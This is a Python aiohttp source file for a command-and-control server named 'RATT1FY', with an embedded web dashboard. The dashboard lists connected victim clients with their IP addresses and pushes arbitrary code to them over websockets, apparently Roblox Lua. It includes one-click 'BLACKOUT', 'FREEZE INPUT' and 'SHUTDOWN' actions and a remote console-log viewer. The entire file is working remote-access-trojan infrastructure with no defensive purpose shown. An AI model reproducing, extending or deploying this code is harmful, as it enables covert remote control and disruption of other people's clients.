import os, asyncio, json
from aiohttp import web

# --- SERVER CONFIG ---
clients = {} 
logs = []
game_console_logs = {} 
INTERNAL_SCRIPT_ID = "cnVzdHlSYXR0MWZ5ODI2NzUkODM=" 

HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>RATT1FY | C2_NODE</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Inter:wght@300;500&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #06080d; --glass: rgba(180, 255, 0, 0.08); --border: rgba(198, 255, 74, 0.38); --neon-green: #b9ff00; --neon-red: #ff3e3e; --neon-blue: #91ff43; --neon-orange: #d9ff4d; --lime-dark: #1b2300; --lime-soft: #dcff72; }
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 20%, #1d2a00 0%, #0a1200 40%, #050607 100%);
            color: #f4ffd2;
            display: flex;
            height: 100vh;
            margin: 0;
            overflow: hidden;
            position: relative;
        }
        body::before {
            content: "";
            position: fixed;
            inset: -30%;
            background:
                radial-gradient(circle, rgba(190,255,0,0.12) 0 2px, transparent 2px 100%),
                linear-gradient(120deg, rgba(157,255,0,0.1), rgba(0,0,0,0));
            background-size: 22px 22px, 100% 100%;
            animation: drift 18s linear infinite;
            pointer-events: none;
            z-index: 0;
            filter: blur(0.2px);
        }
        body::after {
            content: "";
            position: fixed;
            inset: 0;
            background: linear-gradient(140deg, rgba(177,255,0,0.18), rgba(7,10,0,0.06), rgba(211,255,114,0.12));
            mix-blend-mode: screen;
            animation: pulseGlow 6s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }
        #sidebar { width: 380px; background: rgba(20, 30, 0, 0.46); backdrop-filter: blur(14px); padding: 20px; border-right: 1px solid var(--border); overflow-y: auto; position: relative; z-index: 1; box-shadow: inset 0 0 35px rgba(194,255,58,0.08); }
        #main { flex: 1; padding: 30px; display: flex; flex-direction: column; gap: 20px; position: relative; z-index: 1; }
        .stat-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; }
        .stat-card { background: linear-gradient(135deg, rgba(31,45,0,0.45), rgba(14,16,0,0.65)); border: 1px solid var(--border); padding: 15px; border-radius: 12px; text-align: center; box-shadow: 0 0 18px rgba(185,255,0,0.14); }
        .stat-card b { font-family: 'Orbitron'; font-size: 16px; color: var(--neon-green); text-shadow: 0 0 12px rgba(185,255,0,0.95); animation: textFlicker 2.8s infinite; }
        .control-panel { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; flex: 1; }
        .action-box { background: linear-gradient(150deg, rgba(30,42,0,0.5), rgba(0,0,0,0.65)); border: 1px solid var(--border); padding: 20px; border-radius: 15px; display: flex; flex-direction: column; gap: 10px; box-shadow: 0 0 22px rgba(185,255,0,0.1), inset 0 0 20px rgba(190,255,0,0.06); }
        .btn { padding: 12px; border-radius: 10px; border: none; cursor: pointer; font-weight: 700; font-size: 11px; transition: 0.3s; text-transform: uppercase; border: 1px solid rgba(193,255,59,0.6); letter-spacing: 0.8px; text-shadow: 0 0 8px rgba(205,255,102,0.9); box-shadow: 0 0 12px rgba(190,255,0,0.2); }
        .btn:hover { transform: translateY(-2px) scale(1.01); filter: brightness(1.2); box-shadow: 0 0 18px rgba(196,255,74,0.65); }
        .btn-active-red { background: var(--neon-red) !important; color: #000 !important; box-shadow: 0 0 15px var(--neon-red); }
        .btn-active-blue { background: var(--neon-blue) !important; color: #000 !important; box-shadow: 0 0 15px var(--neon-blue); }
        textarea { flex: 1; background: rgba(0,0,0,0.76); color: var(--neon-green); border: 1px solid var(--border); padding: 15px; border-radius: 10px; font-family: 'Consolas', monospace; resize: none; outline: none; box-shadow: inset 0 0 16px rgba(201,255,87,0.12); }
        #logs { height: 80px; background: rgba(12,18,0,0.7); border-radius: 10px; padding: 12px; font-size: 11px; color: #d5fca2; overflow-y: auto; border: 1px solid var(--border); text-shadow: 0 0 6px rgba(185,255,0,0.5); }
        .client-item { padding: 12px; border-radius: 8px; margin-bottom: 10px; cursor: pointer; background: linear-gradient(140deg, rgba(35,47,0,0.56), rgba(12,15,0,0.7)); border: 1px solid transparent; font-size: 11px; transition: all .28s ease; }
        .client-item:hover { border-color: rgba(205,255,102,0.65); box-shadow: 0 0 15px rgba(190,255,0,0.18); transform: translateX(2px); }
        .client-item.selected { border-color: var(--neon-green); background: rgba(179, 255, 0, 0.12); box-shadow: 0 0 18px rgba(185,255,0,0.35); }
        .client-item b { color: var(--lime-soft); font-size: 13px; text-shadow: 0 0 10px rgba(204,255,110,0.9); }
        .ip-text { color: var(--neon-orange); font-family: 'Consolas', monospace; text-shadow: 0 0 8px rgba(215,255,109,0.8); }
        #console-window { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 700px; height: 450px; background: #070b00; border: 1px solid var(--neon-orange); z-index: 1000; flex-direction: column; border-radius: 15px; box-shadow: 0 0 34px rgba(197,255,75,0.35); }
        #console-header { background: linear-gradient(90deg, #b2ff17, #daff66); color: #131800; padding: 10px; font-weight: bold; display: flex; justify-content: space-between; }
        #console-content { flex: 1; padding: 15px; overflow-y: auto; color: var(--neon-orange); font-family: 'Consolas', monospace; font-size: 11px; white-space: pre-wrap; text-shadow: 0 0 9px rgba(205,255,102,0.7); }
        h3, .btn, #console-header span, .stat-card span { animation: textFlicker 3s infinite; }
        @keyframes drift {
            0% { transform: translate3d(-2%, -2%, 0) rotate(0deg); }
            50% { transform: translate3d(2%, 2%, 0) rotate(2deg); }
            100% { transform: translate3d(-2%, -2%, 0) rotate(0deg); }
        }
        @keyframes pulseGlow {
            0%, 100% { opacity: 0.6; }
            50% { opacity: 0.95; }
        }
        @keyframes textFlicker {
            0%, 19%, 21%, 60%, 62%, 100% { opacity: 1; }
            20%, 61% { opacity: 0.65; }
        }
    </style>
</head>
<body>
    <div id="sidebar">
        <h3 style="font-family:'Orbitron'; font-size:14px; color:var(--neon-blue); letter-spacing:1px; text-shadow:0 0 12px rgba(190,255,0,0.95)">⚡ RATT1FY NETWORK NODES</h3>
        <div id="client-list"><div class="client-item selected" onclick="selectClient('all')"><b>GLOBAL_BROADCAST</b></div></div>
    </div>
    <div id="main">
        <div class="stat-grid">
            <div class="stat-card"><span>Active</span><b id="node-count">0</b></div>
            <div class="stat-card"><span>Target</span><b id="current-target" style="color:var(--neon-blue)">ALL</b></div>
            <div class="stat-card"><span>Uptime</span><b style="color:var(--neon-green)">STABLE</b></div>
        </div>
        <div class="control-panel">
            <div class="action-box">
                <button id="btn-blackout" class="btn" style="background:#222; color:var(--neon-red); border-color:var(--neon-red)" onclick="toggleAction('blackout')">🌑 BLACKOUT</button>
                <button id="btn-freeze" class="btn" style="background:#222; color:var(--neon-blue); border-color:var(--neon-blue)" onclick="toggleAction('freeze')">🔒 FREEZE INPUT</button>
                <button class="btn" style="background:var(--neon-orange); color:#000" onclick="toggleWindow('console-window')">📜 REMOTE F9</button>
                <button class="btn" style="background:#440000; color:#fff" onclick="quick('game:Shutdown()')">⚠️ SHUTDOWN</button>
            </div>
            <div class="action-box">
                <textarea id="code" placeholder="-- Input payload..."></textarea>
                <button class="btn" style="background:var(--neon-green); color:#000; font-family:'Orbitron'" onclick="send()">RUN_CODE</button>
            </div>
        </div>
        <div id="logs"></div>
    </div>
    <div id="console-window">
        <div id="console-header"><span>REMOTE_LOGS</span><span onclick="toggleWindow('console-window')" style="cursor:pointer;">[X]</span></div>
        <div id="console-content"></div>
    </div>
    <script>
        let selectedClient = "all";
        let states = { blackout: false, freeze: false };
        function toggleWindow(id) { const w = document.getElementById(id); w.style.display = (w.style.display==='flex')?'none':'flex'; }
        function selectClient(id) { selectedClient = id; updateUI(); }
        async function quick(c) { await fetch('/send', {method:'POST', body: JSON.stringify({code: c, target: selectedClient}), headers:{'Content-Type':'application/json'}}); }
        async function send() { await quick(document.getElementById('code').value); }
        async function toggleAction(type) {
            states[type] = !states[type];
            const btn = document.getElementById(type === 'blackout' ? 'btn-blackout' : 'btn-freeze');
            if(type === 'blackout') {
                btn.innerHTML = states.blackout ? "🌕 RESTORE" : "🌑 BLACKOUT";
                btn.className = states.blackout ? "btn btn-active-red" : "btn";
                await quick(`_G.SetBlackout(${states.blackout})`);
            } else {
                btn.innerHTML = states.freeze ? "🔓 UNFREEZE" : "🔒 FREEZE INPUT";
                btn.className = states.freeze ? "btn btn-active-blue" : "btn";
                await quick(`_G.BlockInput(${states.freeze})`);
            }
        }
        async function updateUI() {
            try {
                const res = await fetch('/status'); const data = await res.json();
                document.getElementById('node-count').innerText = data.clients.length;
                document.getElementById('logs').innerHTML = data.logs.slice().reverse().map(l => `<div>${l}</div>`).join('');
                let html = `<div class="client-item ${selectedClient === 'all' ? 'selected' : ''}" onclick="selectClient('all')"><b>GLOBAL_BROADCAST</b></div>`;
                data.clients.forEach(c => { 
                    html += `<div class="client-item ${selectedClient===c.id?'selected':''}" onclick="selectClient('${c.id}')">
                        <b>${c.name}</b> <br>
                        <span class="ip-text">${c.ip}</span> <br>
                        <small>${c.exec}</small>
                    </div>`; 
                });
                document.getElementById('client-list').innerHTML = html;
                if (selectedClient !== "all" && data.console[selectedClient]) {
                    document.getElementById('console-content').innerHTML = data.console[selectedClient].join('<br>');
                }
            } catch(e) {}
        }
        setInterval(updateUI, 2000);
    </script>
</body>
</html>
"""

async def handle_index(request): return web.Response(text=HTML_PAGE, content_type='text/html')

async def handle_status(request):
    c_list = [{"id": k, "name": v['info'].get('name'), "exec": v['info'].get('exec'), "ip": v['info'].get('ip')} for k, v in clients.items()]
    return web.json_response({"clients": c_list, "logs": logs[-10:], "console": game_console_logs})

async def handle_send(request):
    d = await request.json(); t, c = d.get('target'), d.get('code')
    if t == "all":
        for cl in clients.values(): await cl['ws'].send_str(c)
    elif t in clients: await clients[t]['ws'].send_str(c)
    return web.Response(text="OK")

async def websocket_handler(request):
    ws = web.WebSocketResponse(); await ws.prepare(request); cid = str(id(ws))
    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                d = json.loads(msg.data)
                if d.get("type") == "init":
                    if d.get("script_id") == INTERNAL_SCRIPT_ID:
                        clients[cid] = {"ws": ws, "info": d}
                        game_console_logs[cid] = ["> SYSTEM_OK"]
                        logs.append(f"🟢 {d['name']} logged from {d['ip']}")
                        break
                    else:
                        await ws.close(); return ws
    except:
        await ws.close(); return ws

    try:
        async for msg in ws:
            if msg.type == web.WSMsgType.TEXT:
                d = json.loads(msg.data)
                if d.get("type") == "f9_log":
                    game_console_logs[cid].append(f"[{d.get('time', '00:00')}] {d.get('msg')}")
                    if len(game_console_logs[cid]) > 50: game_console_logs[cid].pop(0)
    finally:
        if cid in clients: del clients[cid]
        if cid in game_console_logs: del game_console_logs[cid]
    return ws

app = web.Application()
app.add_routes([web.get('/', handle_index), web.get('/ws', websocket_handler), web.get('/status', handle_status), web.post('/send', handle_send)])
web.run_app(app, host='0.0.0.0', port=7860)
